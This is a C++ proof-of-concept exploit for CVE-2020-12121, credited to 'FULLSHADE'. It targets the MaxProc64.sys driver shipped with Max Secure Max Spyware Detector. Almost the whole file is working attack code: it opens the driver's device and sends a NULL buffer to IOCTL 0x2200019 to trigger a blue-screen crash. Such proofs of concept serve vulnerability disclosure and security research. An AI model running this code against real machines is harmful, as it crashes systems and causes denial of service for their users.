/*

CVE-2020-12121

In Max Secure Max SPyware Detector 1.0.0.044, the driver file (MaxProc64.sys) allows local users to cause a denial of service (BSOD)
or possibly have unspecified other impact because of not validating input values from IOCtls 0x2200019. 
This also extends to the various other products from Max Secure which include this driver. 

Author: FULLSHADE

*/
#include <windows.h>
#include <iostream>

int WinMain(HINSTANCE hInstance,
            HINSTANCE hPrevInstance,
            LPSTR lpCmdLine,
            int nShowCmd){

    std::cout << "Sending NULL to the IOCTL: 0x2200019\n";
    Sleep(2);

    HANDLE hDevice;
    DWORD nbBytes;
    hDevice = CreateFileA("\\\\.\\MaxProc64", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    std::cout << "Triggering BSOD, press any button to envoke BSOD";
    int reSend = DeviceIoControl(hDevice, 0x2200019, (LPVOID)0, 0x0, (LPVOID)0, 0x0, &nbBytes, NULL);
    
    if(reSend == 1){
        std::cout << "IOCTL sent, success";
    } else {
        std::cout << "[!] POC failed! - " << GetLastError();               
    }
            
    system("pause");
            
    return 0;
}
